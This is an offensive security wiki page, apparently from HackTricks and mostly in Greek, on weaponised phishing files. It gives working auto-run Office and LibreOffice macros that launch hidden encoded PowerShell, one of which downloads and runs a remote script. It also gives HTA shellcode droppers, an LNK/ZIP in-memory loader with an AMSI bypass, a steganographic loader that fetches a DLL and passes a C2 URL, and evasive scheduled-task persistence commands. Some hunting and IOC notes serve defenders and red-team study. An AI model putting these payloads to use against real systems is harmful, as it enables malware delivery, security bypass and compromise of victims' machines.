# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων γίνεται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει κάποιο σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα Word αρχεία που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομάσεις το αρχείο αλλάζοντας την επέκταση και να διατηρήσεις τις δυνατότητες εκτέλεσης macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ κατασκευής, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα αντιμετωπιστεί από το Microsoft Word και θα μπορεί να εκτελέσει macros.\
Τα ίδια εσωτερικά και οι ίδιες μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείς να χρησιμοποιήσεις την ακόλουθη εντολή για να ελέγξεις ποιες επεκτάσεις πρόκειται να εκτελεστούν από ορισμένα Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX αρχεία που αναφέρονται σε ένα remote template (File –Options –Add-ins –Manage: Templates –Go) το οποίο περιλαμβάνει macros μπορούν επίσης να “execute” macros.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελεστεί arbitrary code από το document.

#### Autoload functions

Όσο πιο συχνά χρησιμοποιούνται, τόσο πιο πιθανό είναι το AV να τις detect.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Χειροκίνητη αφαίρεση μεταδεδομένων

Πήγαινε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάνε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσεις, επίλεξε το dropdown **Save as type**, άλλαξε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάνε το αυτό επειδή **δεν μπορείς να αποθηκεύσεις macros μέσα σε ένα `.docx`** και υπάρχει ένα **stigma** **γύρω** από την extension **`.docm`** με macro-enabled (π.χ. το εικονίδιο της μικρογραφίας έχει ένα τεράστιο `!` και κάποια web/email gateways τα μπλοκάρουν εντελώς). Επομένως, αυτή η **legacy `.doc` extension είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Τα LibreOffice Writer documents μπορούν να ενσωματώνουν Basic macros και να τα εκτελούν αυτόματα όταν ανοίγει το αρχείο, συνδέοντας το macro στο event **Open Document** (Tools → Customize → Events → Open Document → Macro…). Ένα απλό reverse shell macro μοιάζει ως εξής:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στο string – το LibreOffice Basic τα χρησιμοποιεί για να κάνει escape literal quotes, ώστε payloads που τελειώνουν σε `...==""")` να διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε ως `.odt` και κάντε bind τη macro στο event του document ώστε να εκτελεστεί αμέσως μόλις ανοιχτεί.
- Όταν στέλνετε email με `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` απαιτείται ώστε να σταλούν τα bytes του αρχείου, όχι το string του filename, ως attachment). Αυτό είναι κρίσιμο όταν abusing SMTP servers που δέχονται arbitrary `RCPT TO` recipients χωρίς validation.

## HTA Files

Ένα HTA είναι ένα Windows program που **συνδυάζει HTML και scripting languages (such as VBScript and JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του security model ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως είναι **installed** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` dependent on IE**. Άρα, αν έχει απεγκατασταθεί, τα HTAs δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Υπάρχουν αρκετοί τρόποι να **force NTLM authentication "remotely"**, για παράδειγμα, θα μπορούσες να προσθέσεις **invisible images** σε emails ή HTML που θα ανοίξει ο χρήστης (even HTTP MitM?). Ή να στείλεις στο θύμα τη **διεύθυνση αρχείων** που θα **trigger** ένα **authentication** απλώς με το **άνοιγμα του folder.**

**Check these ideas and more in the following pages:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάς ότι δεν μπορείς μόνο να κλέψεις το hash ή το authentication αλλά και να **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Πολύ αποτελεσματικές campaigns παραδίδουν ένα ZIP που περιέχει δύο νόμιμα decoy documents (PDF/DOCX) και ένα κακόβουλο .lnk. Το trick είναι ότι το actual PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από ένα μοναδικό marker, και το .lnk το carves και το εκτελεί πλήρως in memory.

Typical flow implemented by the .lnk PowerShell one-liner:

1) Locate το αρχικό ZIP σε common paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και το parent του current working directory.
2) Read τα ZIP bytes και find ένα hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
3) Copy το ZIP to %ProgramData%, extract there, and open το decoy .docx to appear legitimate.
4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate το next stage (e.g., remove all # characters) and execute it in memory.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα υποdomains PaaS (π.χ. *.herokuapp.com) και μπορεί να κάνει gate τα payloads (να σερβίρει benign ZIPs ανάλογα με IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα disk artifacts.

Persistence που χρησιμοποιήθηκε στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control ώστε το IE/Explorer ή οποιοδήποτε app που το ενσωματώνει να ξαναεκκινεί αυτόματα το payload. Δες λεπτομέρειες και έτοιμες προς χρήση εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files που περιέχουν το ASCII marker string (π.χ. xFIQCV) appended to the archive data.
- .lnk που enumerates parent/user folders για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads που καταλήγουν σε links hosted under trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Ένα άλλο επαναλαμβανόμενο pattern είναι ένα **document-impersonating `.lnk`** που ανοίγει αμέσως ένα benign lure ενώ κάνει stage την πραγματική αλυσίδα στο background.

Observed workflow:
1. Το shortcut **masquerades as a PDF** και χρησιμοποιεί `conhost.exe` ή έναν παρόμοιο proxy για να εκκινήσει ένα obfuscated PowerShell downloader.
2. Το PowerShell σπάει εμφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ώστε naive detections που ψάχνουν για `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να χάσουν την εντολή.
3. Ο stager κατεβάζει πρώτα το **decoy document**, το ανοίγει για το θύμα, και μετά αναδομεί τα malicious files στο background.
4. Τα payloads μπορεί να γράφονται με **junk extensions** και μετά να μετονομάζονται αφαιρώντας filler characters, καθυστερώντας την εμφάνιση προφανών `.exe` / `.cpl` artifacts.
5. Persistence established με ένα **minute-based scheduled task** που εκκινεί ένα trusted host binary από path με δυνατότητα εγγραφής από τον χρήστη.

Ελάχιστες ενδείξεις hunting από αυτό το pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ένα χρήσιμο staging layout για να αναγνωρίσεις είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ή `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο stage είναι stealthy

Στην περίπτωση μελέτης της Rapid7, το scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε staged δίπλα του και εξήγαγε το **`RunFODW`**, το trusted Microsoft binary έκανε side-load το attacker CPL αντί για το legitimate system copy.

Το CPL μετά:
- Διαβάζει ένα **AES-256-CBC** blob από `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω **Windows CNG / `bcrypt.dll`**
- Δεσμεύει executable memory και αντιγράφει το decrypted shellcode
- Το εκτελεί έμμεσα περνώντας το shellcode pointer ως callback για το **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει ξεχωριστό hunting: το malware συχνά αποφεύγει ένα direct `((void(*)())buf)()` jump και αντί γι’ αυτό καταχράται ένα **legitimate callback-taking WinAPI** για να μεταφέρει την εκτέλεση.

Το decrypted payload σε αυτή την campaign ήταν shellcode **Donut**, το οποίο μετά έκανε map το τελικό PE πλήρως in memory και έκανε patch τα **AMSI/WLDP/ETW** στο current process πριν παραδώσει την εκτέλεση. Για πιο βαθιές σημειώσεις σχετικά με side-loading και memory-resident post-processing, δες:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά hunting pivots:
- `.lnk` που εκκινεί `powershell.exe` ή `conhost.exe` και ακολουθείται από ορατό decoy document.
- Βραχύβια downloads στο **`C:\Users\Public\`** ακολουθούμενα αμέσως από renames από nonsense extensions.
- Scheduled tasks με bland ονόματα όπως `GoogleErrorReport` που εκτελούνται από **user-writable directories**.
- Trusted binaries που φορτώνουν **`.cpl` / `.dll`** αρχεία από το ίδιο non-system directory.
- Base64 text blobs γραμμένα κάτω από **`C:\Windows\Tasks\`** και μετά διαβασμένα από το side-loaded module.

## Steganography-delimited payloads σε εικόνες (PowerShell stager)

Recent loader chains παραδίδουν obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Εκείνο το stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως plain text ανάμεσα σε unique start/end markers. Το script ψάχνει αυτά τα delimiters (παραδείγματα που έχουν παρατηρηθεί στο wild: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το between-text, το Base64-decodes σε bytes, φορτώνει το assembly in-memory και καλεί μια γνωστή entry method με το C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). Δες περισσότερα για process hollowing και trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- Αυτό είναι ATT&CK T1027.003 (steganography/marker-hiding). Οι δείκτες διαφέρουν μεταξύ campaigns.
- Το AMSI/ETW bypass και η απο-συγκόλληση strings εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Hunting: σάρωσε downloaded images για γνωστά delimiters· εντόπισε PowerShell που προσπελάζει images και αμέσως αποκωδικοποιεί Base64 blobs.

Δες επίσης stego tools και carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα επαναλαμβανόμενο initial stage είναι ένα μικρό, έντονα obfuscated `.js` ή `.vbs` που παραδίδεται μέσα σε archive. Ο μοναδικός του σκοπός είναι να αποκωδικοποιήσει ένα embedded Base64 string και να εκκινήσει PowerShell με `-nop -w hidden -ep bypass` για να bootstrap το επόμενο stage μέσω HTTPS.

Skeleton logic (abstract):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` με `-enc`/`FromBase64String` στη command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` από user temp paths.

## Windows files to steal NTLM hashes

Δες τη σελίδα για **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
